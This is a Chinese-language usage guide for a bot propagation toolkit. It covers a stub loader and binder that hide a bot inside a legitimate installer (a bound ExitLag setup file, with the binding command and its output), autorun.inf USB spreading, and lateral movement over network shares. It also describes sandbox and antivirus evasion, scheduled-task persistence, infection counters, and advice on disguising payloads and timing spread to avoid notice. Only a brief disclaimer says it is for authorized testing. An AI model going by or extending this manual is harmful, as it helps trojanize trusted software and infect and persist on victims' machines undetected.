# Bot传播机制使用说明

## 概述

本项目为bot创建了完整的传播机制，包括文件绑定、USB传播、网络传播等多种传播方式。系统兼容Windows 8、8.1、10和11（64位）。

## 组件说明

### 1. 核心组件

#### Stubloader (stubloader.exe)
- **功能**: 提取和执行绑定的载荷
- **大小**: 42KB
- **特性**: 
  - 反调试和虚拟机检测
  - Windows 8-11兼容
  - 静态链接，无外部依赖

#### Binder (binder.exe)
- **功能**: 将bot和诱饵文件绑定到stubloader中
- **大小**: 45KB
- **用法**: `binder.exe <stubloader.exe> <bot.exe> <decoy.exe> <output.exe>`

#### 传播库 (libpropagation.a)
- **功能**: 提供传播功能的静态库
- **大小**: 83KB
- **特性**: USB传播、网络传播、文件绑定等

### 2. 传播方式

#### USB传播
- 自动检测可移动驱动器
- 创建autorun.inf文件
- 复制绑定的可执行文件
- 设置隐藏和系统属性

#### 网络传播
- 扫描网络共享
- 横向移动
- 感染网络资源

#### 文件绑定传播
- 将bot绑定到合法文件
- 保持原文件功能
- 透明执行载荷

## 使用示例

### 绑定ExitLag安装程序

我们成功将bot绑定到SetupExitLag-5.15.2-x64.exe：

```bash
# 使用binder绑定文件
wine ./build/prop/binder.exe \
    ./build/prop/stubloader.exe \
    ./bot/bot.exe \
    ./SetupExitLag-5.15.2-x64.exe \
    ./BoundExitLag.exe
```

### 绑定结果

```
=== Binding Successful ===
Output file: ./BoundExitLag.exe
File sizes:
  Stubloader: 42,496 bytes
  Bot: 14,336 bytes  
  Decoy: 105,380,056 bytes
  Output: 105,437,184 bytes
  Overhead: 296 bytes (0.0003%)
```

## 兼容性分析

### 支持的Windows版本
- ? Windows 8 (64位)
- ? Windows 8.1 (64位)
- ? Windows 10 (64位)
- ? Windows 11 (64位)

### 架构支持
- **主要**: x86-64 (64位)
- **注意**: 32位文件在Windows 11上可能需要额外配置

### 依赖项
- 使用标准Windows API，兼容性较好
- 静态链接，无外部DLL依赖
- 需要Visual C++运行时（通常系统自带）

## 安全特性

### 反检测机制
1. **沙箱检测**: 检测虚拟机和分析环境
2. **进程检测**: 识别常见的杀毒软件进程
3. **时间随机化**: 随机化传播时间避免检测
4. **文件隐藏**: 设置隐藏和系统属性

### 权限管理
- 自动检测管理员权限
- 适应不同权限级别运行
- 使用计划任务实现持久化

## 传播统计

系统提供详细的传播统计信息：

```c
typedef struct {
    int total_attempts;        // 总尝试次数
    int successful_infections; // 成功感染数
    int failed_attempts;       // 失败尝试数
    int usb_infections;        // USB感染数
    int network_infections;    // 网络感染数
    int file_bindings;         // 文件绑定数
    SYSTEMTIME last_propagation; // 最后传播时间
} PropagationStats;
```

## 配置选项

### 传播延迟
```c
#define PROPAGATION_DELAY 10000    // 10秒延迟
#define USB_SCAN_INTERVAL 30000    // 30秒扫描间隔
```

### 目标限制
```c
#define MAX_TARGETS 100           // 最大目标数量
#define MAX_PATH_LEN 512          // 最大路径长度
```

## 部署建议

### 1. 测试环境
- 在隔离的Windows虚拟机中测试
- 验证不同Windows版本的兼容性
- 测试杀毒软件检测情况

### 2. 文件伪装
- 选择常见的合法软件作为诱饵
- 保持原始文件的图标和属性
- 使用可信的文件描述信息

### 3. 传播策略
- 避免在工作时间传播（23:00-06:00最佳）
- 监控系统资源使用率
- 实施传播频率限制

## 注意事项

### 法律警告
?? **重要**: 此工具仅用于授权的安全测试和研究目的。未经授权使用可能违反法律法规。

### 技术限制
1. 需要目标系统支持PE文件执行
2. 某些杀毒软件可能检测到绑定行为
3. Windows Defender可能需要特殊处理

### 最佳实践
1. 定期更新反检测机制
2. 测试新的Windows更新兼容性
3. 监控传播成功率并优化策略

## 故障排除

### 常见问题

#### 1. 绑定失败
- 检查输入文件是否为有效PE文件
- 确认有足够的磁盘空间
- 验证文件权限

#### 2. 传播不工作
- 检查目标系统权限
- 验证网络连接
- 确认杀毒软件状态

#### 3. 兼容性问题
- 使用analyze_exe_compatibility.sh分析
- 检查Windows版本支持
- 验证架构匹配（32位/64位）

## 更新日志

### v1.0 (2025-08-15)
- ? 实现基础文件绑定功能
- ? 添加USB传播机制
- ? 支持Windows 8-11兼容性
- ? 集成反检测功能
- ? 完成ExitLag绑定测试

## 技术支持

如需技术支持或报告问题，请查看：
- `PROJECT_SUMMARY.md` - 项目总体说明
- `BINDER_USAGE.md` - 绑定工具详细说明
- `/home/kali/vms/analysis_results/` - 兼容性分析结果

---

**免责声明**: 本工具仅供授权的安全研究和测试使用。使用者需自行承担使用风险和法律责任。
